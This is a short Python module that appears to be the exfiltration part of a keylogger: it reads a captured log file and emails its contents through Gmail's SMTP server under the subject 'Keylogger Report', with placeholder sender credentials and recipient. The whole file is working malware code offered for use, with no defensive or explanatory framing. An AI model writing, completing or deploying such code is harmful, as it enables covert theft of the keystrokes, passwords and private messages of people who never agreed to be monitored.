import smtplib
from email.mime.text import MIMEText

EMAIL_ADDRESS = "youremail@example.com"      # Change this
EMAIL_PASSWORD = "your_app_password_here"    # Use App password (not Gmail password)
TO_EMAIL = "youremail@example.com"           # Or any receiver

def send_logs_via_email(log_file):
    with open(log_file, "r", encoding="utf-8") as f:
        data = f.read()

    if not data.strip():
        return  # Don't send empty logs

    msg = MIMEText(data)
    msg["Subject"] = "Keylogger Report"
    msg["From"] = EMAIL_ADDRESS
    msg["To"] = TO_EMAIL

    try:
        with smtplib.SMTP_SSL("smtp.gmail.com", 465) as server:
            server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
            server.send_message(msg)
        print("[+] Log sent successfully.")
    except Exception as e:
        print("[-] Failed to send email:", e)
